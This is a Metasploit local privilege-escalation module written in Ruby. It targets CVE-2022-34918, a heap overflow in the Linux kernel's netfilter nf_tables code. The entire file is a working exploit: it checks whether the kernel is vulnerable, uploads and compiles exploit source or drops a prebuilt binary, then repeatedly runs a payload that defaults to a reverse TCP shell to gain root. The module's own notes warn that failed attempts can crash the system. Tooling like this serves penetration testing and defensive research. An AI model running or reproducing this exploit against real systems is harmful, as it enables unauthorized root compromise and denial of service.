# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = AverageRanking
  include Msf::Post::Common
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Kernel
  include Msf::Post::Linux::Compile
  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Netfilter nft_set_elem_init Heap Overflow Privilege Escalation',
        'Description' => %q{
          An issue was discovered in the Linux kernel through 5.18.9.
          A type confusion bug in nft_set_elem_init (leading to a buffer overflow)
          could be used by a local attacker to escalate privileges.
          The attacker can obtain root access, but must start with an unprivileged
          user namespace to obtain CAP_NET_ADMIN access.
          The issue exists in nft_setelem_parse_data in net/netfilter/nf_tables_api.c.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Arthur Mongodin <amongodin[at]randorisec.fr> (@_Aleknight_)', # Vulnerability discovery, original exploit PoC
          'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>' # Metasploit module, exploit PoC updates
        ],
        'DisclosureDate' => '2022-02-07',
        'Platform' => 'linux',
        'Arch' => [ARCH_X64],
        'SessionTypes' => %w[meterpreter shell],
        'DefaultOptions' => {
          'Payload' => 'linux/x64/shell_reverse_tcp',
          'PrependSetresuid' => true,
          'PrependSetresgid' => true,
          'PrependFork' => true,
          'WfsDelay' => 30
        },
        'Targets' => [['Auto', {}]],
        'DefaultTarget' => 0,
        'Notes' => {
          'Reliability' => [UNRELIABLE_SESSION], # The module could fail to get root sometimes.
          'Stability' => [OS_RESOURCE_LOSS, CRASH_OS_DOWN], # After too many failed attempts, the system needs to be restarted.
          'SideEffects' => [ARTIFACTS_ON_DISK]
        },
        'References' => [
          ['CVE', '2022-34918'],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2022-34918'],
          ['URL', 'https://ubuntu.com/security/CVE-2022-34918'],
          ['URL', 'https://www.randorisec.fr/crack-linux-firewall/'],
          ['URL', 'https://github.com/randorisec/CVE-2022-34918-LPE-PoC']
        ]
      )
    )

    register_options(
      [
        OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', %w[Auto True False] ]),
        OptInt.new('MAX_TRIES', [ true, 'Number of times to execute the exploit', 5])
      ]
    )

    register_advanced_options(
      [
        OptString.new('WritableDir', [true, 'Directory to write persistent payload file.', '/tmp'])
      ]
    )
  end

  def base_dir
    datastore['WritableDir']
  end

  def upload_exploit_binary
    @executable_path = ::File.join(base_dir, rand_text_alphanumeric(5..10))
    upload_and_chmodx(@executable_path, exploit_data('CVE-2022-34918', 'ubuntu.elf'))
    register_file_for_cleanup(@executable_path)
  end

  def upload_payload_binary
    @payload_path = ::File.join(base_dir, rand_text_alphanumeric(5..10))
    upload_and_chmodx(@payload_path, generate_payload_exe)
    register_file_for_cleanup(@payload_path)
  end

  def upload_source
    @exploit_source_path = ::File.join(base_dir, rand_text_alphanumeric(5..10))
    mkdir(@exploit_source_path)
    register_dir_for_cleanup(@exploit_source_path)
    dirs = [ '.' ]
    until dirs.empty?
      current_dir = dirs.pop
      dir_full_path = ::File.join(::Msf::Config.install_root, 'external/source/exploits/CVE-2022-34918', current_dir)
      Dir.entries(dir_full_path).each do |ent|
        next if ent == '.' || ent == '..'

        full_path_host = ::File.join(dir_full_path, ent)
        relative_path = ::File.join(current_dir, ent)
        full_path_target = ::File.join(@exploit_source_path, current_dir, ent)
        if File.file?(full_path_host)
          vprint_status("Uploading #{relative_path} to #{full_path_target}")
          upload_file(full_path_target, full_path_host)
        elsif File.directory?(full_path_host)
          vprint_status("Creating the directory #{full_path_target}")
          mkdir(full_path_target)
          dirs.push(relative_path)
        else
          print_error("#{full_path_host} doesn't look like a file or a directory")
        end
      end
    end
  end

  def compile_source
    fail_with(Failure::BadConfig, 'make command not available on the target') unless command_exists?('make')
    info = cmd_exec("make -C #{@exploit_source_path}")
    vprint_status(info)
    @executable_path = ::File.join(@exploit_source_path, 'ubuntu.elf')
    if exists?(@executable_path)
      chmod(@executable_path, 0o700) unless executable?(@executable_path)
      print_good('Compilation was successful')
    else
      fail_with(Failure::UnexpectedReply, 'Compilation has failed (executable not found)')
    end
  end

  def run_payload
    success = false
    1.upto(datastore['MAX_TRIES']) do |i|
      vprint_status "Execution attempt ##{i}"
      info = cmd_exec(@executable_path, @payload_path)
      info.each_line do |line|
        vprint_status(line.chomp)
      end
      if session_created?
        success = true
        break
      end
      sleep 3
    end
    if success
      print_good('A session has been created')
    else
      print_bad('Exploit has failed')
    end
  end

  def get_external_source_code(cve, file)
    file_path = ::File.join(::Msf::Config.install_root, "external/source/exploits/#{cve}/#{file}")
    ::File.binread(file_path)
  end

  def module_check
    release = kernel_release
    version = "#{release} #{kernel_version.split(' ').first}"
    ubuntu_offsets = strip_comments(get_external_source_code('CVE-2022-34918', 'src/util.c')).scan(/kernels\[\] = \{(.+?)\};/m).flatten.first
    ubuntu_kernels = ubuntu_offsets.scan(/"(.+?)"/).flatten
    if ubuntu_kernels.empty?
      fail_with(Msf::Module::Failure::BadConfig, 'Error parsing the list of supported kernels.')
    end
    fail_with(Failure::NoTarget, "No offsets for '#{version}'") unless ubuntu_kernels.include?(version)

    fail_with(Failure::BadConfig, "#{base_dir} is not writable.") unless writable?(base_dir)
    fail_with(Failure::BadConfig, '/tmp is not writable.') unless writable?('/tmp')

    if is_root?
      fail_with(Failure::BadConfig, 'Session already has root privileges.')
    end
  end

  def check
    config = kernel_config

    return CheckCode::Unknown('Could not retrieve kernel config') if config.nil?

    return CheckCode::Safe('Kernel config does not include CONFIG_USER_NS') unless config.include?('CONFIG_USER_NS=y')

    return CheckCode::Safe('Unprivileged user namespaces are not permitted') unless userns_enabled?

    return CheckCode::Safe('LKRG is installed') if lkrg_installed?

    arch = kernel_hardware

    return CheckCode::Safe("System architecture #{arch} is not supported") unless arch.include?('x86_64')

    release = kernel_release

    version, patchlvl = release.match(/^(\d+)\.(\d+)/)&.captures
    if version&.to_i == 5 && patchlvl && (7..19).include?(patchlvl.to_i)
      return CheckCode::Appears # ("The kernel #{version} appears to be vulnerable, but no offsets are available for this version")
    end

    CheckCode::Safe
  end

  def exploit
    module_check unless datastore['ForceExploit']

    if datastore['COMPILE'] == 'True' || (datastore['COMPILE'] == 'Auto' && command_exists?('make'))
      print_status('Uploading the exploit source code')
      upload_source
      print_status('Compiling the exploit source code')
      compile_source
    else
      print_status('Dropping pre-compiled binaries to system...')
      upload_exploit_binary
    end
    print_status('Uploading payload...')
    upload_payload_binary
    print_status('Running payload on remote system...')
    run_payload
  end
end
